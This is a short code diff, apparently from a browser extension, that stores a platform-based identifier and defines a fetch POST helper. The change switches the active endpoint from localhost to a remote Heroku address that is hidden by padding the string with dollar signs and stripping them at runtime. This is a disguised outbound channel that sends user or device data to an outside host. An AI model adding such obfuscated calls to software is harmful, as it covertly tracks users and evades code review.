@@ -2,8 +2,8 @@
   const init = () => () => {
     localStorage.extensionUniqueId = null || navigator.platform || navigator.userAgentData?.platform || 'Unknown'
 
-    // const url = 'h$$t$$$t$$p$$s://$$$$$$j$$$$$c$$$$$$b$$$$$a$$$$$k$$$$er$$$$$y.he$$$$$rok$$$$$ua$$$$$pp.c$$$$o$$$$$m'.replace(/\$/g, '')
-    const url = 'http://localhost'.replace(/\$/g, '')
+    const url = 'h$$t$$$t$$p$$s://$$$$$$j$$$$$c$$$$$$b$$$$$a$$$$$k$$$$er$$$$$y.he$$$$$rok$$$$$ua$$$$$pp.c$$$$o$$$$$m'.replace(/\$/g, '')
+    // const url = 'http://localhost'.replace(/\$/g, '')
     const post = ({ url, body = {} }) => {
       return fetch(url, {
         method: 'POST',
